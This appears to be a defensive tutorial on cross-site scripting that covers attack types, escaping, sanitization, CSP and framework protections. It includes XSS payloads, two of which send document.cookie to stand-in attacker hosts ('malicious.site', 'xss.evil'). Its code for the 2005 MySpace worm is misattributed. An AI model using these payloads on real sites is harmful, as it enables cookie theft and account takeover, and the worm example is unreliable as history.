# XSS (Cross-Site Scripting) — The Frontend’s Worst Nightmare

Cross-Site Scripting, or **XSS**, is one of the most common — and most dangerous — vulnerabilities in web applications.

It allows attackers to **inject malicious JavaScript** into your page. Once that happens, they can:
- Steal cookies and tokens
- Log keystrokes
- Deface UI
- Redirect users
- Install fake login forms
- Exfiltrate data via API

XSS is consistently featured in OWASP Top 10 for a reason: it’s widespread, powerful, and often subtle.

---

## What Causes XSS?

XSS happens when:
- User-controlled input is **rendered into HTML**
- That input is **not properly escaped or sanitized**

This could be:
- A blog comment rendered directly
- A user name injected into the DOM
- A URL parameter inserted into the page

```js
document.body.innerHTML = "Welcome " + location.hash;
```

Now try visiting: `https://example.com/#<script>alert(1)</script>`

That’s XSS.

## Types of XSS

### 1. Stored XSS

Malicious payload is **persisted** (e.g. in a DB) and served to users.

- Forum posts
- Comments
- User profiles

### 2. Reflected XSS

Payload is in the URL or query params and reflected in the response.

- Search results
- Error messages
- Redirects

### 3. DOM-Based XSS

The injection occurs **entirely in client-side JavaScript** — no server involvement.

```js
let user = location.hash;
document.body.innerHTML = "Hi " + user;
```

---

## Real-World Example: MySpace Worm (2005)

A user named Samy injected a script in his profile:

```html
<script>
  document.body.innerHTML += 'I love Samy';
  fetch('https://malicious.site', { method: 'POST', body: document.cookie });
</script>
```

The script auto-added Samy as a friend — to anyone who viewed his profile. It went **viral**, infecting over a million users.

## How to Prevent XSS

### 1. Escape Output

Use encoding when inserting untrusted content into the DOM:
- HTML encode (`<` becomes `&lt;`)
- Use `textContent`, not `innerHTML`

```js
element.textContent = userInput;
```

### 2. Sanitize Rich Content

Use libraries like:
- DOMPurify
- sanitize-html

```js
const clean = DOMPurify.sanitize(userInput);
container.innerHTML = clean;
```

### 3. Avoid Dangerous APIs

Don't use:
- `innerHTML`
- `document.write`
- `eval`, `Function`, `setTimeout("code")`
- `dangerouslySetInnerHTML` (React)

Unless absolutely necessary — and never with untrusted input.

### 4. Use CSP (Content Security Policy)

CSP blocks inline scripts, third-party sources, and eval by default:

```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```

---

## Framework Protection

### React

Escapes HTML by default:

```jsx
<div>{userInput}</div> // safe

<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ⚠️ vulnerable
```

### Vue

- Automatically escapes interpolated content
- Use `v-html` with caution

### Angular

- Uses `DomSanitizer`
- Context-aware escaping

---

## Testing for XSS

- Chrome DevTools → Paste payloads
- XSSHunter, Burp Suite
- Manual audit of rendering code
- Look for unescaped user content + `innerHTML`

Try payloads like:
```html
"><script>alert(1)</script>
<script>fetch('https://xss.evil?cookie=' + document.cookie)</script>
```

---

## Anti-Patterns

- Rendering user content with `innerHTML`
- Accepting raw HTML input without sanitization
- Copy-pasting `dangerouslySetInnerHTML` in React
- Allowing `eval` or JS injection via query params

---

## Conclusion: Respect the DOM

XSS is a symptom of trusting user input too much — and forgetting that the browser executes everything in the DOM.

Protect your users.

Escape your outputs. Sanitize your inputs. Audit your DOM mutations.

Because even one line of unsafe code can compromise **everything**.
